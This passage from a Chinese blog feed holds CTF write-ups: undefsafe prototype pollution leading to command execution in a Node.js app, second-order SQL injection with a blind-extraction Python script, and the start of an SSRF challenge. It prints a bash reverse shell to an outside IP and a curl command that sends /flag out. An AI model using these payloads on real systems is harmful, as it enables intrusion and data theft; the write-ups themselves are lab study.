&#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>大概审了一遍之后就会知道，在&#x2F;status路由里面执行了命令，只要能够污染commands里面的属性就能rce，接下来就要去看看怎么样才能污染这个属性。</p><p>看了一下只有undefsafe这个模块能够修改对象的属性，搜了一下该模块在低版本存在原型链污染漏洞，先来了解一下undefsafe模块</p><blockquote><p><code>undefsafe</code> 是一个用于安全地访问对象属性的库。它提供了一种安全的方法来访问嵌套在对象中的属性，而不会导致错误。这在处理可能不存在的属性时非常有用，因为它可以避免抛出异常，但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞。</p></blockquote><p>下面是几个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure><p>下面是一个原型链污染的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure><p>这时候toString属性就被我们修改了，那么根据上面的代码他会将commands对象所有的属性列出来，那么我们就可以利用原型链添加一个我们想要的属性值即可。</p><p>能让我们足够自由传参数的污染的函数就是edit_note()</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了该函数的位置就在&#x2F;edit_note路由</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>那我们只要控制id为__ proto __即可污染。</p><p>这里一开始传了参数发现会报错给我整不会了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173335763.png" alt="image-20240320173335763"></p><p>去看了wp说报错也不影响。</p><p>那我就先试了一下污染成ls，但是没有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173550096.png" alt="image-20240320173550096"></p><p>然后用了一下curl是能监听到的，那就可以直接反弹shell了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure><blockquote><p>难绷弹不回来不知道为什么，那就用curl吧。。。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320174451680.png" alt="image-20240320174451680"></p><p>参考文章：<a href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p><h1 id="网鼎杯-2018-unfinish"><a href="#网鼎杯-2018-unfinish" class="headerlink" title="[网鼎杯 2018]unfinish"></a>[网鼎杯 2018]unfinish</h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><blockquote><p>总结一下就是二次利用恶意数据，第一次发送的恶意数据经过转义后存入数据库，但之后从数据取出数据利用的时候并没有转义，那这个时候我们的恶意数据就会生效。</p></blockquote><p>进去就给了一个login.php，扫了一下发现还有register.php</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326000952219.png" alt="image-20240326000952219"></p><p>随便注册一个账号登录进去之后就是一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326001047845.png" alt="image-20240326001047845"></p><p>可以看到上图的左侧中会回显一个用户名，这就是第二次利用数据库中的数据，那应该就是在注册的用户名上动手脚了</p><p>在注册页面的用户名输了一下逗号发现被过滤了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326002729728.png" alt="image-20240326002729728"></p><p>那我们就先去爆破一下看看过滤了什么关键词</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326003157517.png" alt="image-20240326003157517"></p><p>看到似乎是只过滤了information和逗号</p><p>猜测一下sql语句如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure><p>我们去注册一下用户名0’ and ‘1 看一下，可以发现用户名变成了0，即存在二次注入</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328145045188.png" alt="image-20240328145045188"></p><p>这里可以了解一下MySQL中字符串的运算</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144630707.png" alt="image-20240328144630707"></p><p>执行select ‘0’+database()变成了0：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144719610.png" alt="image-20240328144719610"></p><p>不过用下面的查询方式就能知道数据库名的第一个字符的ascii码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144824861.png" alt="image-20240328144824861"></p><p>题中过滤了逗号可以用下面的方式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144917362.png" alt="image-20240328144917362"></p><p>然后我们就可以进行盲注，因为过滤了information，所以wp猜测表名为flag，只能说很猜谜。</p><p>那脚本如下，因为邮箱不能重复注册，所以每次注册都要不一样（不想写了偷个懒）</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328150712672.png" alt="image-20240328150712672"></p><blockquote><p>不过还是觉得很奇怪，按照上面的查询语句不应该是为空嘛查询出来的值？</p><p>网上也没找到源码不清楚具体是怎么样的</p></blockquote><p>参考文章：<a href="https://juejin.cn/post/7158228802844229662#heading-1">https://juejin.cn/post/7158228802844229662#heading-1</a></p><h1 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h1><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-信息搜集</title>
      <link href="/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
